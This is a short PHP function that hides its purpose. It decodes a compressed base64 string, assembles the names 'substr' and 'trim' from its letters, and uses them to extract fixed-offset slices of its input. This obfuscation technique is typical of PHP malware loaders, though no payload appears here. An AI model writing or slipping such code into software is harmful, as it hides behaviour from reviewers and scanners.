function OO0O00O0OO($a, $b) {
    $c = array(860, 324, 32, 2538);
    $k = gzinflate(base64_decode("KyrNTcosKQYA"));
    $O0O0 = $k[6].$k[1].$k[3].$k[6].$k[5].$k[0];
    $O0 = "$k[5]$k[0]$k[4]$k[2]";
    if ($b == 170) {
        $d = $O0O0($a, $c[0] + $c[1], $c[2]);
    }
    elseif($b == 8) {
        $d = $O0O0($a, $c[0], $c[1]);
    }
    elseif($b == 12) {
        $d = $O0($O0O0($a, $c[0] + $c[1] + $c[2]));
    }
    return$d;
}
